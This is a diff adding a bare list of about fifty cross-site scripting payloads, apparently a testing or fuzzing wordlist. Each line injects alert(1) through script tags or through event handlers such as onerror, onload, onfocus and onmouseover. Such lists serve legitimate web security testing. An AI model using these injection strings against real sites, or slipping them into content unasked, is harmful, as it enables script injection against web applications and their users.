@@ -1,0 +1,50 @@
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'-alert(1)-'
+<svg/onload=alert(1)>
+"><svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe/onload=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>
+<obj onmouseover=alert(1)>
+<menu onmouseover=alert(1)>
+<a onmouseover=alert(1)>
+<p onmouseover=alert(1)>
+<div onmouseover=alert(1)>
+<span onmouseover=alert(1)>
+<ul onmouseover=alert(1)>
+<ol onmouseover=alert(1)>
+<li onmouseover=alert(1)>
+<table onmouseover=alert(1)>
+<tr onmouseover=alert(1)>
+<td onmouseover=alert(1)>
+<th onmouseover=alert(1)>
+<h1 onmouseover=alert(1)>
+<h2 onmouseover=alert(1)>
+<h3 onmouseover=alert(1)>
+<h4 onmouseover=alert(1)>
+<h5 onmouseover=alert(1)>
+<h6 onmouseover=alert(1)>
+<b onmouseover=alert(1)>
+<i onmouseover=alert(1)>
+<u onmouseover=alert(1)>
+<s onmouseover=alert(1)>
+<em onmouseover=alert(1)>
+<strong onmouseover=alert(1)>
+<code onmouseover=alert(1)>
+<pre onmouseover=alert(1)>
+<blockquote onmouseover=alert(1)>
+<q onmouseover=alert(1)>
+<cite onmouseover=alert(1)>
+<dfn onmouseover=alert(1)>
+<abbr onmouseover=alert(1)>
+<time onmouseover=alert(1)>
+<var onmouseover=alert(1)>
+<samp onmouseover=alert(1)>
